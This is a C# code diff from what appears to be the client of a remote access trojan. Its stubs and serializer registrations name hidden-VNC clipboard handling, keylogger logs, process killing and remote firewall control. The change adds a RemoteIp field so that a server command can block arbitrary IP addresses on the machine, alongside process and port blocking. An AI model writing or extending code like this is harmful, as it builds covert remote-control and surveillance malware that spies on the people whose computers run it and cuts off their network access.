@@ -488,11 +488,12 @@ internal class TlsClient : IDisposable
                 case PacketType.TcpFirewallBlock:
                     var fwBlock = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.TcpFirewallBlockStub);
                     if (fwBlock != null)
-                        _ = WritePacketAsync(new Packet
-                        {
-                            Type = PacketType.TcpFirewallRulesResult,
-                            Data = TcpManagerFeature.BlockProcess(fwBlock.ProcessName, fwBlock.Port, fwBlock.Direction)
-                        }, ct);
+                    {
+                        string fwResult = !string.IsNullOrEmpty(fwBlock.RemoteIp)
+                            ? TcpManagerFeature.BlockIp(fwBlock.RemoteIp, fwBlock.Direction)
+                            : TcpManagerFeature.BlockProcess(fwBlock.ProcessName, fwBlock.Port, fwBlock.Direction);
+                        _ = WritePacketAsync(new Packet { Type = PacketType.TcpFirewallRulesResult, Data = fwResult }, ct);
+                    }
                     break;
 
                 case PacketType.TcpFirewallUnblock:
@@ -1880,6 +1881,7 @@ internal class HvncClipboardDataStub
 [JsonSerializable(typeof(ProcListResultStub))]
 [JsonSerializable(typeof(ProcKillDataStub))]
 [JsonSerializable(typeof(List<ProcEntryStub>))]
+[JsonSerializable(typeof(List<string>))]
 // Keylogger
 [JsonSerializable(typeof(KeyloggerLogsResultStub))]
 [JsonSerializable(typeof(KeyloggerFileInfo))]
@@ -1954,7 +1956,7 @@ internal class PerfMonDataStub   { public float CpuUsage { get; set; } public lo
 internal class ProcSuspendResumeStub { public int Pid { get; set; } }
 
 // ── TCP Firewall ──────────────────────────────────────
-internal class TcpFirewallBlockStub   { public string ProcessName { get; set; } = ""; public int Port { get; set; } public string Direction { get; set; } = "both"; }
+internal class TcpFirewallBlockStub   { public string ProcessName { get; set; } = ""; public int Port { get; set; } public string RemoteIp { get; set; } = ""; public string Direction { get; set; } = "both"; }
 internal class TcpFirewallUnblockStub { public string RuleName { get; set; } = ""; }
 internal class TcpFirewallRuleStub    { public string RuleName { get; set; } = ""; public string ProcessName { get; set; } = ""; public int Port { get; set; } public string Direction { get; set; } = ""; }
 internal class TcpFirewallRulesResultStub { public List<TcpFirewallRuleStub> Rules { get; set; } = []; }
